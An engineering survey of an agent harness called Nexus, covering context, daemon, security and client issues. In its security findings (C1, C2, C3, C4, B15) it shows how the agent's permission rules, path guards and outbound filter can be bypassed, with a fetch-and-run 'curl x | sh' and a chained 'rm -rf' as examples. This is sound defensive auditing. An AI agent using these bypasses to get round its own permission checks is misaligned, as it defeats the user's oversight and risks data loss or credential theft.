# Nexus improvements plan

Status: survey only. Nothing in this file has been implemented. Written 2026-10-08
against `main` at `a225adb`, with uncommitted web Markdown work in the tree.

How it was made: this file was written in two passes. First came the high-level
picture (section 1). Then six read-only surveys covered: (A) loop, context and
models; (B) host, sessions and security; (C) tools, agents and extensions; (D) the
terminal client and CLI; (E) the desktop and web clients; and (F) tests, docs,
release and code health. Each finding cites the code. Most were confirmed by
reading it, and a few by running a read-only check (marked). Two were spot-checked
again when this file was written: A1 and B1. Items marked *unverified* are
inferences. Line numbers drift, so search for the symbol if a line has moved.

Severity: **H** high, **M** medium, **L** low.

## 1. High-level picture

Nexus is a provider-agnostic agent harness. A per-workspace daemon owns sessions
and turns. Four surfaces are clients of it through the host contract:

- the native Ratatui terminal client
- the one-shot CLI/JSONL
- the browser app, slated for deprecation
- the Rust GPUI desktop client

Its promise is that **context is clearly presented to the user and to agents**.
Nothing the agent sees is hidden, and everything is labelled and readable.

The architecture is sound and enforced by tests: one-way layering, a durable
append-only log, views built by the reducer, and a single host contract. What
needs improvement is mostly *correctness at the edges, finish and consistency*,
not the foundations. Seven themes stand out.

1. **Context management works against the core promise.** No summarizer is wired.
   `hybrid` compaction evicts tool results on every request, whatever the budget.
   Dropped or evicted history is never shown to the user. Once the threshold is
   crossed, the prompt cache misses on every iteration. Token estimates for
   images and documents are far too low, and provider "context too long" errors
   are not recovered.
2. **Daemon robustness has sharp edges.** Opening a trashed session spins the
   event loop forever. SQLite writes run synchronously on the loop, and every
   token delta is its own fsynced commit. Trashed sessions are never purged. The
   UDS link has no timeouts and blocks behind slow commands. Protocol skew after
   an upgrade silently drops connections.
3. **Security posture has gaps.** `Bash(...)` permission globs match chained
   commands. `$HOME` in deny roots resolves inside the workspace. The default
   config lets the agent read `~/.nexus/credentials.json`. Python hooks fail
   open. NAT64 addresses pass the outbound filter.
4. **Not everything is bounded.** By default there is no turn limit and no tool
   timeout backstop. Background jobs have no concurrency cap. The SSE decoder
   has no line cap, and neither do the daemon log nor the desktop stdin bound.
5. **Context is not always shown clearly.** `nexus run` and `nexus replay` drop
   tool parameters and results. Several caps clip without saying so. `/details`,
   `/cost` and the permission prompt dump internal fields.
6. **Surface parity and the client roadmap are drifting.** Logic is duplicated
   between Python, Rust and JS: ranking, Markdown, tool details and approval keys.
   The web client is still getting features despite the freeze and has no
   removal path. Much of the desktop overhaul is still open, and the desktop is
   never built in CI.
7. **Docs, CI and repo hygiene lag the code.** Plan ledgers that docstrings cite
   were deleted, and links are broken. The README contradicts `docs/`. CI skips
   the desktop, the widget tests, Playwright, Linux and Python 3.14. The sdist
   probably cannot build the TUI. There is no LICENSE. Several modules are
   5,000 lines or more.

## 2. Detailed findings

### A. Agent loop, context and models

**A1. Hybrid compaction evicts tool results on every request (H).**
- `_hybrid_compact` (`nexus/context/manager.py:2135`) always calls
  `evict_tool_results`, even when nothing needs dropping.
- `hybrid` is the default strategy (`config/schema.py:481`).
- `DEFAULT_KEEP_RECENT = 6` (`manager.py:117`).
- `_will_compact` returns True unconditionally (`manager.py:1991`), so
  `PreCompact` fires, and is persisted, on every iteration.
- `tests/test_context_budget.py:551-572` asserts this behaviour.
- Effect: Read and Bash output older than about three tool rounds is replaced by a
  "re-run Read" note. The model then re-reads files, and the cached prefix moves.

*Fix:* evict only when projected usage crosses `compact_at_fraction`, and only
until the history fits. Fire `PreCompact` only when something is actually
evicted or dropped. Update the test and `docs/context.md:90`.

**A2. Dropped and evicted history is invisible (H).**
- `context.compacted` is emitted only when a summary is persisted
  (`manager.py:1493`, `1850`; `core/loop.py:1968`).
- With no summarizer wired, drop and evict never produce it.
- `ui/cli/render.py:159` has a renderer for that event that never fires.
- No `ui_support` code reads `history_dropped` or `evicted`.

*Fix:* emit `context.compacted` whenever the dropped or evicted count is
non-zero, with counts and the affected call ids or sequence range. Render it as a
labelled row on every surface.

**A3. No summarizer, and no low-water mark (H).**
- There is no concrete `Summarizer`; only the Protocol exists, at
  `context/compact.py:98`. This is a known gap (`docs/decisions.md:133`).
- `_apply_compaction_threshold` (`manager.py:1558`) cuts the history to exactly
  the trigger. Past 85%, every iteration drops a few more messages from the
  front, so the Anthropic history cache breakpoint misses every time.

*Fix:* wire a tier-`low` summarizer in `Runtime`. The `append_summary` path
already exists. Compact down to about 50–60% of the budget so the prefix stays
stable.

**A4. Token estimates are wrong, and there is no overflow recovery (H).**
- Images and documents count as about 25 tokens (`context/parts.py:244`), but
  `IMAGE_TOKEN_ESTIMATE = 1600` already exists (`tools/manager.py:86`).
- The tokenizer's `code=True` ratio is never used (`model/tokenizer.py:23`).
- Each image is re-hashed with sha256 2–3 times per iteration.
- A provider "context too long" error fails the turn.

*Fix:*
- Use per-type estimates for images and documents.
- Use the code ratio for JSON and tool blocks.
- Cache the digests.
- On an overflow error, retry once with a reduced history budget.

**A5. Turns have no bound by default (M).**
- `max_iterations = 0` and `max_turn_seconds = 0` both mean unlimited
  (`config/schema.py:143`).
- The `TurnLimits` token caps (`core/turn.py:130`) are never fed from config.

*Fix:* ship a high finite default (for example 200 iterations) and expose
`[agent] max_total_tokens`. Keep 0 as an explicit opt-out.

**A6. Capability degradation matches substrings (M).**
- No adapter raises `CapabilityRejected`.
- `_rejected_feature` (`core/loop.py:905`) matches substrings such as
  `"tool_use"` in any error. An Anthropic error about an orphan `tool_use` id
  therefore drops the tool schemas and logs a registry mismatch.

*Fix:* have adapters raise `CapabilityRejected` from structured error codes, and
add negative tests.

**A7. Overload is retried only for OpenAI (M).**
- 529 is not in `retry_statuses` (`model/http.py:209`).
- The Anthropic in-stream `overloaded_error` (`anthropic.py:744`) and Gemini's
  `UNAVAILABLE` (`gemini.py:862`) become a plain `ProviderError`.

*Fix:* add 529 to the retryable statuses, and map these errors to
`ProviderOverloaded`.

**A8. The SSE decoder is unbounded and quadratic (M).**
- `SSEDecoder` (`model/http.py:116-167`) rescans its whole buffer on every chunk
  and has no size cap.
- Error bodies are read whole before clipping (`http.py:434`, `464`, `548`).

*Fix:* keep a scan offset, cap the pending line at about 16 MiB, and read error
bodies with a bounded read of about 64 KiB.

**A9. A `count_tokens` round trip precedes every model call (M).**
- `_maybe_refine` (`manager.py:1609`) awaits an exact count before every request.
- The cache key covers the whole request, so it almost never hits.
- Cache misses fsync and prune synchronously on the event loop
  (`context/cache.py:225`).

*Fix:* count exactly only when near the budget, with a short timeout and no
retries. Otherwise calibrate from the last `usage.prompt`. Move the cache I/O to
`asyncio.to_thread`.

**A10. Partial output is lost on cancel or error (M).** The assistant message is
appended only on success (`core/loop.py:2142`, `2541`).

*Fix:* persist the collected text and thinking as an interrupted assistant
message, without ToolUse blocks.

**A11. Fallback models reuse the primary's request (M).**
- `core/loop.py:1979` assembles once with the primary's budget.
- A fallback model with a smaller window then fails.

*Fix:* re-assemble for a smaller fallback, or skip fallbacks that cannot hold
the current usage.

**A12. Claude Agent errors are collapsed into one message (M).**
- stderr goes to `DEVNULL` (`model/providers/claude_agent.py:151`).
- Every failure reads "install claude-agent-sdk and run `claude auth login`", and
  none is retryable.

*Fix:* return a typed, redacted error kind, map overloads, and keep a bounded
stderr tail for `nexus daemon logs`.

**A13. Catalogue parsing blocks the event loop (M).** This is behind the known
gap of `doctor` taking about 0.7 s.
- `_read_cache` (`model/registry.py:1388`) parses the 5.3 MB `models.dev.json`
  synchronously. The parse alone measured 73 ms.
- `DEFAULT_MAX_BYTES = 8 MiB` (`registry.py:82`) leaves about 50% headroom.
- A failed refresh does not update the mtime, so every start retries with a 20 s
  timeout.

*Fix:* write a pre-filtered msgspec cache, parse it in a thread, raise the size
cap, and back off after a failed refresh.

**A14. Codex OAuth does not refresh on 401 (L).**
- A revoked token fails every request until it expires (TTL up to 24 h,
  `auth/codex.py:160`).
- The credential file is re-read on every request (`codex.py:110`).

*Fix:* on 401, clear the token and retry once. Cache the record by file mtime.

**A15. A malformed tool call ends stream reading (L).**
- The `MalformedToolCall` catch sits outside the `async for`
  (`core/loop.py:862`), so later tool calls, usage and stop events are lost.
- `loop.py:1168` is dead code.

*Fix:* catch the error per event, record it, and continue. Remove the dead clause.

**A16. Context inspection relies on private internals and clips silently (L).**
- `Runtime.inspect_context` pokes `_pre_compact` and `_env` (`runtime.py:2745`).
- `_request_snapshot` clips the system prompt at 200k chars and keeps 256 tools
  with no flag (`core/loop.py:128`).

*Fix:* add a public `preview()` seam and `system_clipped` / `tools_omitted`
fields.

**A17. `DirectoryWatcher` recursion is unbounded (L).** `core/watch.py:48`
`rglob`s skill roots with no cap, for example over a `node_modules` tree. This is
inferred, not measured.

*Fix:* cap the depth and file count per poll, and report when the cap is hit.

**A18. Doc drift in `docs/models.md` (L).**
- The OpenCode Go paragraph is duplicated (`:160`, `:163`), and one copy breaks
  the Authentication table.
- The tier table names `openai-codex/…` and `claude-sonnet-5.5`. The code
  (`model/tiers.py:36`) uses `codex/…` and `claude-agent/claude-sonnet-5-5`.
- `_first_pinned` (`router.py:257`) is documented but nothing calls it.

### B. Host, sessions, storage and security

**B1. Opening a trashed session loops forever (H).** `SessionManager.open`
(`nexus/session/manager.py:279`) loops `while True`:
- `store.exists()` is False for a trashed row.
- `create_draft` does nothing when the row exists.
- So the loop never exits, and every pass runs SQL on the event loop.

`SessionSubscribe` and `SessionOpen` default to `create=True`, as do HTTP
`/v1/events` and other paths. A stale client tab can therefore hang the whole
daemon.

*Fix:* raise `SessionError("session is in trash")` when the row exists but is
trashed. Make read-only paths use `create=False`. Add a test.

**B2. Trash is never purged (H).**
- `purge_expired` (`manager.py:690`, `db.py:1025`) is called only from tests,
  although `docs/sessions.md` promises 7-day removal.
- Child (`agents`) sessions are not trashed with their parent.
- There is no VACUUM, `secure_delete` or WAL checkpoint, and session lock files
  are never removed.
- Effect: deleted content stays in `~/.nexus/nexus.db` indefinitely.

*Fix:* call `purge_expired` from the hourly sweep and cascade it to child
sessions. Consider `secure_delete` with incremental vacuum.

**B3. SQLite writes block the event loop, and every delta is fsynced (H/M).**
- Each `text.delta` is persisted (`session.py:310`) as a `BEGIN IMMEDIATE` write
  under `synchronous=FULL`.
- No `to_thread` is used anywhere in `nexus/session/`.
- `busy_timeout=5000` applies on a DB shared by every workspace daemon, and
  `OperationalError` is not handled.
- Every `open()` does an `unarchive` write.
- Thread-local connections are never closed.

*Fix:*
- Publish deltas live only; the aggregate events are already durable.
- Use a single writer thread with retry on `SQLITE_BUSY`.
- Skip the no-op `unarchive` write.

**B4. Live-only `daemon.*` events break replay parity (M).**
- `Daemon._emit` (`daemon.py:786`) sends `seq=0` events into session
  subscriptions.
- The reducer stores them as diagnostics (`view/reduce.py:1601`). They are never
  persisted, so a reconnect, or the web client, shows a different `diagnostics`
  list. This breaks AGENTS.md rule 5.

*Fix:* send them on a separate frame type, or have the reducer ignore unsequenced
`daemon.*` events. Add a test that live state equals replayed state.

**B5. An oversized result drops the UDS connection (M).**
- `FrameTooLarge` above 16 MiB is swallowed (`daemon.py:353`), and the client
  just sees the connection close.
- `SessionExport` and `SessionState` are unbounded.

*Fix:* encode the result first and return `ErrorResult(kind="ResultTooLarge")`.
Add paged or streamed export.

**B6. The UDS link blocks and has no timeouts (M).**
- Commands run inline, one at a time per connection (`daemon.py:275`).
- No timeouts are set on `UDSClient.call`, `write_frame` or the cross-daemon
  calls in `ProjectSessionOpen`.
- A full subscription queue stalls every `ResultFrame` (`uds.py:345`), which
  contradicts its own docstring.

*Fix:*
- Give each command a bounded task.
- Add write and command timeouts.
- On queue overflow, end the subscription with a resync marker.

**B7. Queued inputs restored after a daemon restart never run (M).**
- `_rehydrate_queue` (`session.py:1353`) refills the queue, but with
  `auto_start_queued=False` (`facade.py:1953`) nothing submits those items.
- The session is stuck in `awaiting_input`, and delete is refused.
- Confirmed by reading the code, not run.

*Fix:* the first time the facade takes over a session, submit a parked pending
item for each restored entry. Add a host-level restart test.

**B8. A stale pid check can block daemon start (M).**
- `_reclaim_stale` (`daemon.py:833`) refuses to start if the recorded PID is
  alive, even though holding the `flock` already proves the old daemon is dead.
- After PID reuse, the workspace becomes unstartable.

*Fix:* trust the lock, log the PID, and reclaim.

**B9. `NEXUS_HOME` is honoured only partly (M).**
- The DB and credentials honour it.
- `user_config_path` (`config/paths.py:64`) and the Settings global root
  (`host_support/settings_scope.py:44`) use `Path.home()/.nexus`.
- Dev mode therefore reads, and Settings writes to, the real config.

*Fix:* route both through `nexus_home()`.

**B10. Presence churn and catch-up reads (M).**
- Each subscribe or unsubscribe persists 4 records (`session.py:1197`, `1232`).
- Gap healing treats message records as gaps and re-reads the full log for each
  subscriber (`session.py:1213`).

*Fix:* make presence ephemeral or coalesced. Track the last record seq, and query
`seq > last` by index.

**B11. Protocol skew drops clients silently (M).**
- `PROTOCOL_VERSION = 3` has not changed across about 20 protocol commits.
- An unknown command closes the connection without a reply (`daemon.py:268`).
- `Welcome.server` is never compared by any client.
- Daemon enumeration skips the `/tmp` fallback dir and `VersionMismatch`
  daemons (`install.py:134`).

*Fix:* return `ErrorResult("UnknownCommand")`, compare build versions and restart
an idle daemon, and enumerate the fallback dir.

**B12. `WebLaunch` errors escape the handler (M/L).** `daemon.py:294` has no
`try`, so the client gets no reply and an unredacted traceback goes to `.err`.

*Fix:* catch the error and return a redacted `ErrorResult`.

**B13. A turn can start before its viewer is counted (M).**
- `client/turn_stream.py:52` relies on a single `sleep(0)`.
- The approval policy is fixed from `attended` at turn start, so the turn may run
  as unattended.
- The pump queue is unbounded.
- *Unverified*: not reproduced.

*Fix:* register presence before replying to `SessionSubscribe`, and have the
client wait for the acknowledgement.

**B14. The daemon log is unbounded (L/M).** `_log` appends forever, and `logs()`
reads the whole file (`daemon.py:944`, `1313`).

*Fix:* rotate by size and tail-read with `seek`.

**B15. NAT64 bypasses the outbound address filter (L/M).** `net/outbound.py:344`
trusts `is_global`, but `64:ff9b::a9fe:a9fe` (the metadata IP) reports
`is_global=True` (checked by running it).

*Fix:* reject `64:ff9b::/96` and `64:ff9b:1::/48`, or re-check the embedded IPv4
address.

**B16. Bearer token strength is not enforced (L).** Any non-empty
`NEXUS_HTTP_TOKEN` is accepted, though the docs promise a strong one.

*Fix:* require at least 32 characters.

**B17. `SessionState(from_seq)` can return `seq=0` (L).** `facade.py:713`
returns a partial fold, so a client resuming at `seq+1` replays everything.

*Fix:* return `max(from_seq, last_seq)`, or remove the partial mode.

**B18. `ProjectSessionOpen` validates with a full scan (L).**
- `facade.py:1437` loads up to 10,000 rows, so older sessions cannot be opened.
- It uses the private `runtime._home`.

*Fix:* look the session up by index.

**B19. Presence approval leases are no-ops (L).**
- Claim and release happen in the same call (`facade.py:838`).
- `detach` clears leases across sessions inconsistently (`presence.py:91`).

*Fix:* remove leases, or key them by `(session, client)` and test them.

**B20. Fire-and-forget tasks (M).**
- `asyncio.ensure_future`/`create_task` results are not kept in
  `host/daemon.py:314,793`, `session/manager.py:364` and `voice/manager.py:98`.
  Such tasks can be garbage-collected, and their exceptions are lost.

*Fix:* keep references in a set with a done-callback, and enable ruff `RUF006`.

### C. Tools, permissions, agents and extensions

**C1. `Bash(...)` globs match chained commands (H).**
- The permission key is the raw command string, and `*` compiles to `.*`
  (`tools/permissions.py:122`, `227`).
- `Bash(git diff*)` matches `git diff; curl x | sh` (checked by running it).
- Deny rules such as `Bash(rm -rf*)` are bypassed by `cd / && rm -rf …`.
- `examples/nexus.toml:64,66` ships exactly these rules.

*Fix:* split on shell control operators, require every segment to match an allow
rule, and deny if any segment matches a deny rule. At minimum, document the
behaviour and fix the examples.

**C2. `$HOME` in a root resolves inside the workspace (H).**
- `schema.py:518` says roots may use `$HOME`.
- `PathGuard._root` (`permissions.py:789`) expands only `~`, so
  `$HOME/.ssh` becomes `<workspace>/$HOME/.ssh` (checked by running it).

*Fix:* expand `$HOME` and `${HOME}`, or reject `$` in roots at validation. Add a
test.

**C3. With default settings the agent can read the credential file (M/H).**
- `mode` defaults to `allow` and `read_denyroots` is empty
  (`schema.py:513`, `519`).
- The `credentials.json` block applies only to the Settings agent
  (`permissions.py:925`).
- This contradicts `docs/security.md:15`.

*Fix:* hard-deny `credentials.json` and `daemon*` under the Nexus home for every
agent. Settle the `allow` vs `ask` default mismatch (`decisions.md:135`).

**C4. Python hooks fail open (M).**
- They are hard-coded to `WARN` (`hooks/manager.py:318`).
- An exception or timeout lets the tool through (`core/loop.py:2323`).
- Sync hooks hold threads in the shared executor and cannot be cancelled
  (`hooks/manager.py:1253`).

*Fix:* honour a declared `on_nonzero` with a fail-closed `block` option. Use a
dedicated bounded executor. Document fail-open as the default.

**C5. No tool timeout backstop (M).** No `ToolManager` construction passes
`default_timeout_s` (`runtime.py:2630`, `3614`, …), so a hung extension tool
blocks the turn.

*Fix:* add a `tools.default_timeout_s` config key (for example 300 s), exempting
`subagent`.

**C6. Background `bash` jobs have no concurrency cap (M).** `JobRegistry.spawn`
(`tools/builtin/_jobs.py:587`) has no limit, while `!` mode is capped at 4.

*Fix:* add `max_running_per_session` (for example 8) with a clear tool error.

**C7. No notification when a background job finishes (M, known gap).**
`_note_finished` (`_jobs.py:678`) emits nothing.

*Fix:* emit a durable `shell.job_completed` event to the owning session, and
optionally add a note to the next turn's context.

**C8. Worktree integrations are recovered only on retry (M).**
`recover_transactions` (`agents/worktree_integrate.py:863`) and `recover_pending`
(`agents/worktrees.py:225`) have no production callers. After a crash mid-merge
the parent checkout stays half-applied.

*Fix:* run both at runtime start and show the results as Doctor rows.

**C9. Execution-time guards differ from the approval guard (M).**
- `read` and `apply_patch` rebuild a `PathGuard` from config
  (`builtin/read.py:69`, `builtin/apply_patch.py:89`).
- That guard has no Settings scopes, worktree boundary or rebasing.
- A bypass is *unverified*.

*Fix:* pass the canonical guard through `ToolContext`.

**C10. `nexus ext restore` is missing, and trash is never purged (M, known gap).**
- `restore`, `list_trashed` and `purge_expired` exist (`ext/manager.py:1120`,
  `1127`, `1178`) but have no host command, no CLI and no caller.

*Fix:* add `ExtensionsTrashList` and `ExtensionsRestore`, plus `nexus ext
trash-list` and `nexus ext restore <id>`. Purge on startup.

**C11. MCP interpolation docs contradict the code (L).**
- The `mcp/client.py:30` docstring and `docs/extending.md:174` say only
  `${env:VAR}` expands.
- The regex at `client.py:128` also expands `${VAR}`, `${VAR:-default}` and
  editor variables.

*Fix:* list the accepted forms in both places.

**C12. Stale "reserved / later packet" docstrings (L).** `ext/manifest.py:159`,
`163`, `550`, `permissions.py:730` and `tools/bundles.py:10` describe features as
future work that already exist.

**C13. `AgentChoiceStore` is unsafe across processes (L).**
- It uses a fixed `.tmp` file with no lock, on a global file shared by every
  daemon (`agents/last_choice.py:46`).
- `effort` is not length-checked.
- Eviction is not least-recently-used.
- It has no test.

**C14. Duplicate parsers and loaders (L).**
- Frontmatter parsing exists in both `skills/frontmatter.py` and
  `agents/model.py`.
- The hook loader repeats the quarantined-import logic of `tools/loader.py`.
- Security fixes would have to be made twice.

**C15. The hook loader catches `BaseException` (L).** `hooks/manager.py:391`
swallows `CancelledError`.

*Fix:* re-raise cancellation before the catch-all.

**C16. Worktree location is undocumented, and worktrees are never pruned (L).**
Worktrees are created at `workspace.parent/.nexus-worktrees-<name>`
(`runtime.py:2311`).

*Fix:* document the location and add a retention policy or Doctor hint.

**C17. The remembered model is not restored for new sessions (L, known gap).**
`docs/agents.md` lists this as not done.

**C18. Voice timeouts do not stop the engine (L).** Inference is shielded
(`voice/manager.py:305`), so it keeps holding the single active slot after a
timeout.

*Fix:* show "previous inference still running" in the status, and consider a
killable subprocess.

### D. Terminal client and CLI

**D1. The CLI prints host text without escaping control characters (H).**
- Affected output: `_render_view_dict`, `_format_summary`, and the agent and
  tool listings in `cli.py:1297`, `1278`, `428` and `449`.
- Model text, titles and extension descriptions can inject terminal escape
  sequences, which contradicts `docs/cli.md`.

*Fix:* escape every host-derived string, and add a replay test with `\x1b]`.

**D2. `nexus replay` loses order and drops tool context (H).**
- `cli.py:1306` prints all the text first, then each tool as
  `[tool NAME STATUS]`.

*Fix:* walk the turns in seq order and render each tool with
`tool_details.sections_to_text`.

**D3. `nexus run` never shows tool parameters or results (H).**
`TerminalRenderer` (`ui/cli/render.py:101`) ignores `tool.input` and
`tool.result`, even though both are emitted (`events.py:64`).

*Fix:* add bounded, labelled handlers for both, and announce any clipping.

**D4. `/help` gets Enter and Ctrl+Enter backwards (M).**
- `ui/cli/commands.py:174` says Enter queues. The code sends steer on Enter
  (`rust/tui/src/main.rs:1842`).

*Fix:* generate the help line from `shortcuts.SHORTCUTS`, and add a test.

**D5. `/details` and `/cost` dump whole objects (M).**
- `ui/ratatui/actions.py:595` and `609` use `to_dict()`.
- The documented `ui/cli/details.py` helper has no callers.

*Fix:* route both through shared formatters, or delete the dead helper and fix
`docs/cli.md`.

**D6. The permission prompt shows internal fields and hides extra prompts (M).**
- `prototype.py:773` uses `labelled(permission.to_dict())`, which shows ids,
  nulls and an epoch timestamp.
- Only the first pending permission or question is projected, with no "1 of N"
  indicator.

*Fix:* reuse a shared prompt formatter, and render "1 of N".

**D7. Context-header inventory cap is silent (M).**
- `rust/tui/src/render/context.rs:51` clips at `count * 5`.
- A test asserts the word "omitted" is absent.
- `docs/module-map.md` claims an omitted indicator exists.

*Fix:* add a muted `+N more` row and fix the docs.

**D8. Tool schema rows are clipped without notice (M).** `ui_support/context_header.py`
keeps 64 properties (`:122`), descriptions up to 300 chars (`:126`) and 8 enum
values (`:112`), with no marker.

*Fix:* add "N more" and "[clipped N characters]" markers.

**D9. Subagent title is cut to 64 chars with no ellipsis (L).**
`prototype.py:312`.

**D10. `nexus chat` imports the whole daemon stack before the splash (M).**
- `nexus/host/__init__.py:21` eagerly imports the daemon, facade and transports.
- `import nexus.ui.cli` measured about 130 ms warm and 380 ms cold.

*Fix:* make the `host` package lazy, and call `spawn()` before the imports.

**D11. Dead Rich renderers are still imported eagerly (L).** These are in
`ui_support/context.py:9`, and only tests use them.

*Fix:* delete them and update the Rich mention in `surfaces.md` and AGENTS.md.

**D12. Slash-command ranking is implemented twice, and the two differ (M).**
- Rust `rank_commands` (`rust/tui/src/main.rs:82`) lacks the fuzzy tier of
  `ui_support/completion.py:69`.
- Pickers use substring matching only.

*Fix:* rank in Python only, or port `fuzzy.py` with shared fixtures.

**D13. CLI approval keys differ from `approval_choices` (M).**
`ui/cli/approve.py:28` has no `d` key and uses different wording.

*Fix:* build the CLI prompt from `ui_support/prompts.approval_choices`.

**D14. CLI color options are documented but unimplemented (L).**
- `render.py:23` ignores `color`.
- Nothing reads `NO_COLOR` or `FORCE_COLOR`.

*Fix:* implement them as documented, or remove the options and the doc sentence.

**D15. The bridge is misnamed and oversized (M).**
- `ui/ratatui/prototype.py` (1,413 lines) is still called "prototype" and
  "experimental". Its `run()` runs from line 920 to the end of the file.
- Rust `main()` spans `main.rs:289` to about `2608`.
- `render.rs` is 4,139 lines.

*Fix:* rename it to `bridge.py` and split out the projection. In Rust, introduce
an `App` struct and `input/*.rs`.

**D16. Many native features are "not verified in a real terminal" (M).**
- `docs/ratatui-parity.md:153`, `176`, `264`, `387`, `546`, `815`.
- `docs/decisions.md:416`, `482`.

*Fix:* add PTY or screenshot scenes for each, then mark them verified.

**D17. `docs/ratatui-parity.md` is stale (L).**
- It contradicts itself on batch gutters.
- One paragraph is duplicated.
- It says schema 2, but the wire is schema 3.
- It still has Textual-era names (also in `surfaces.md:194`).
- It describes the shell-mode routing wrongly.

**D18. Wrong redaction claim in `tool_details.py` (L).** The docstring (`:8`)
says values are redacted; nothing redacts them.

**D19. Toast severity is guessed from text prefixes (L).**
- `actions.py:38` sets the severity from message prefixes.
- The remaining `self.notice =` sites should become `flash(text, level)`.

**D20. `/review` and `/commit` prompts are duplicated (L).** `actions.py:648` and
`ui/web/js/app.js:592`.

*Fix:* add a `prompt` field to `CommandSpec`.

**D21. Shell mode (`!cmd`) silently keeps attachments (L).**
- `actions.py:420` does not clear attachments, so they move to the next prompt.
- The send mode is ignored.

*Fix:* refuse or warn when attachments are present.

**D22. Each projection recomputes static data (L).**
- `importlib.metadata.version` is called each time.
- The preview image is re-base64'd each time.
- The wire encoder deep-compares every key (`prototype.py:548`, `wire.py:22`).

*Fix:* cache these values, then measure with `NEXUS_TUI_TRACE=1`.

**D23. `/export` and `/copy` (L).**
- `/export` pushes an unbounded raw export into a panel (`actions.py:615`).

*Fix:* write the export to a file and show its path, size and format.

### E. Desktop (GPUI) and web clients

**E1. Desktop picker Enter can run a different item than the highlighted one (H).**
- Rendering uses `ranked_filter` (`rust/desktop/src/panels.rs:1638`).
- Navigation and Enter use an unranked substring list (`main.rs:244`, `307`).

*Fix:* use one filtered list for both, and add a test where the two orders
differ.

**E2. Markdown cache thrashes in long sessions (H).**
- `ParsedDocCache::new(256)` is FIFO with `Vec::remove(0)` (`markdown.rs:41`).
- With more than 256 blocks, every snapshot (that is, every token) re-parses
  every block on the UI thread.
- Each apply clones the full transcript text (`transcript.rs:51`).

*Fix:* key by `(block.id, rev)`, use a real LRU (2,048 docs / 16 MiB per the
plan), and prepare only changed or visible blocks.

**E3. A full Python projection runs on every desktop event (H).**
- `prototype.py:991` skips the stream fast path for the desktop.
- Rust decodes a full `Snapshot` per message (`wire.rs:212`).
- This is open Phase 1 work in the overhaul plan.

*Fix:* enable the fast path for the desktop, or project only dirty topics. In
Rust, apply topic deltas.

**E4. The desktop is never built in CI (M/H).**
- `ci.yml:22` builds only `rust/tui`.
- 86 desktop tests and `rust/widgets/tests` never run.
- `main.rs:4` includes the TUI `bridge.rs` with `#[path]`.

*Fix:* add `cargo test` for the desktop and widgets, and make `bridge.rs` a
shared crate.

**E5. The 16 MiB stdin bound is ineffective (M).**
- The check at `main.rs:1968` compares against 64 MiB, so it always passes.
- `main.rs:1948` reports 16 MiB but checks 64 MiB.

*Fix:* use one constant and stop cleanly when it is exceeded.

**E6. Text cache evicts an arbitrary entry (M).** `transcript.rs:12` evicts
`keys().next()`, which can remove visible paragraphs.

*Fix:* evict least-recently-used, or build the planned `SelectableText`.

**E7. Images are re-decoded and compared on every snapshot (M).**
- `wire.rs:232` re-decodes the images.
- `main.rs:720` and `757` compare the base64 data.

*Fix:* compare and cache by `data_ref` id.

**E8. The desktop picker clips at 100 rows silently (M).** `panels.rs:1642`.

*Fix:* virtualize the list, or add an "N more" row.

**E9. Desktop picker ranking differs from the terminal's fuzzy ranking (M/L).**
`panels.rs:2165`. Share the ranking as in D12.

**E10. Unbounded blocking stdout writes, and a fragile Python reader (M).**
- `send()` (`main.rs:82`) writes on the UI thread.
- Paste and draft size are unbounded (`input.rs:305`).
- The Python `readline` and `json.loads` sit outside the `try`
  (`prototype.py:1180`), so one bad line ends the bridge.
- End-to-end behaviour is *unverified*.

*Fix:* use a bounded writer channel, cap paste size with an announced notice, and
handle errors per line.

**E11. Desktop distribution (M).**
- No wheel or app bundle ships the desktop. `nexus desktop` works only from a
  checkout (`ui/desktop/run.py:14`).
- The error message suggests a debug `cargo build` (`run.py:35`).
- The release profile is missing from `rust/desktop/Cargo.toml`.

*Fix:* suggest `--release`, add the release profile, and decide on packaging.

**E12. Remaining overhaul plan work (M).** From `plans/in-progress/DESKTOP_OVERHAUL_PLAN.md:832`:
- Not started: Phases 2, 5 and 6.
- Partial: Phases 1, 3 and 4.
- Open decisions: D1, D3, D5, D6 and D7.
- No performance target (60 fps, under 16 ms keystroke to paint) has been
  measured on a release build.
- `main.rs` is 3,600 lines and `panels.rs` 2,343.

*Next step:* the Phase 1 store and entity split.

**E13. Features "not verified" on the desktop (M/L).**
- Accessibility, non-macOS platforms, provider sign-in, a key sweep, toast
  placement, the context-header tool toggle and the real clipboard
  (`docs/desktop.md:181`, `318`, `417`; `decisions.md:462`).

*Fix:* do a native-app-review pass.

**E14. The "bridge disconnected" notice offers Reconnect, which cannot work (L).**
`main.rs:2079`.

*Fix:* offer Quit instead, and disable the composer.

**E15. `ui/desktop/wire_schedule.py` is a dead shim (L).**

**E16. Web deprecation has no removal path (M).** These are the verified
dependents:
- CLI: `cli.py:168`, `1569`.
- Protocol: `WebLaunch` in `host/protocol.py`.
- Daemon: `host/daemon.py:294`, `531`.
- Transport: `http_sse.py:58`, `652`.
- Facade and `browser_view.py`: `facade.py:734`.
- `ProjectSessionOpen.browser`.
- Package data: `pyproject.toml:66`.
- Tests: 7 `test_web_*.py` files, the Playwright web checks, and `test_host_facade.py`.
- Many `docs/` pages, `README.md` and AGENTS.md.

Suggested order:
1. Print a deprecation warning and add a `decisions.md` entry.
2. Delete the client and its host plumbing, then decide whether HTTP/SSE has a
   remaining consumer.
3. Drop the tests, docs rows and package data.

Note: the uncommitted `highlight.js` and the `markdown.js` extension are new web
features, despite the freeze.

**E17. Web ports have diverged (M).**
- `tool-details.js` has no McpSearch handling, unlike `ui_support/tool_details.py:136`.
- Other ports (`context-view.js`, `usage.js`, `fuzzy.js`, …) are maintained by
  hand. Only `fuzzy` has a test.

*Fix:* prefer removal (E16) over adding parity tests.

**E18. `app.js` is 235 KB in 801 lines (M).** It has lines up to 3,503 chars. It
is not reviewable; freeze it and remove it.

**E19. `docs/surfaces.md:280` still requires web ports and omits the desktop (M/L).**

*Fix:* rewrite the checklist as host → `ui_support` → Ratatui → desktop, with web
only on request.

**E20. The web parity plan is stale in `in-progress/` (L).**
`WEB_TUI_PARITY_PLAN.md:296`.

*Fix:* move it to `done/`, marked superseded.

**E21. Desktop doc drift (L).**
- Stale test counts in `docs/desktop.md`.
- `plans/webplan.md` is cited but missing.
- The README never mentions `nexus desktop`.
- The module-map row misses `wire.rs`, `panels.rs`, `markdown.rs` and others.

**E22. Two Markdown renderers (L).** The desktop uses pulldown-cmark; the web uses
a hand-written subset.

*Fix:* stop extending `markdown.js`.

